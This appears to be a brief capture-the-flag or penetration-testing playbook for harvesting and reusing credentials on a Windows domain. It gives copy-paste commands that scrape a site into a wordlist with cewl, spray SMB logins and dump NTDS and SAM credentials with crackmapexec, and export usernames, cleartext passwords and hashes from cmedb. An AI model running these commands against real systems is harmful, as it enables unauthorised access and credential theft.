No more forgetting to collect the obvious clues into a wordlist and manage the accretion of users, password hashes and passwords (clear).

This is 'workflow' / 'playbook' . Jut some simple steps to follow, ideally with copy and paste.  No more missing the obvious clues for usernames and passwords. It would also be great to have some malortron integration too.

The tools in the workflow:
* cewl
* nmap (-sC)
* crackmapexec
* bash pipelines
* john (for rules)
* john (for cracking)
* hashcat (for cracking)

The workflow has a repeated 'core':
1. take 'output' (usernames, clear passwords, wordlists)
2. rules them
3. append to ongoing wordlist

In each workflow task there is a) 'use ongoing wordlist' and b) 'feed outputs into the core.'

# Core

TODO take all words, usernames and passwords, concat and best64 them. save as `guesses.txt`

? If there are no users discovered, copy `guesses.txt` to `users.txt` ?

# CeWL -- Add to the Wordlist

`cewl -d 3 -o -a -m 4 --with-numbers -v -w wordlist.txt https://target.domain/` 

# CrackMapExec -- use guesses

`crackmapexec smb -d DOMAIN -u ${ctf}/users.txt -p ${ctf}/guesses.txt --ntds drsuapi 10.1.0.100`

`--sam` instead for listing local accounts
`==shares` instead for listing shares

# CrackMapExec -- use hashes

`crackmapexec smb -d DOMAIN -u ${ctf}/users.txt -H ${ctf}/hashes.txt --ntds drsuapi 10.1.0.100`

# CrackMapExec -- save usernames, passwords, hashes

`{ echo export creds csv creds.csv; echo exit; } | cmedb ; awk -F "\"*,\"*" '{print $3}' creds.csv > users.txt` save users to `users.txt`

`{ echo export creds plaintext passwords.txt; echo exit; } | cmedb` save plaintext/passwords to `passwords.txt`

`{ echo export creds hashes hashes.txt; echo exit; } | cmedb` save hashes to `hashes.txt`
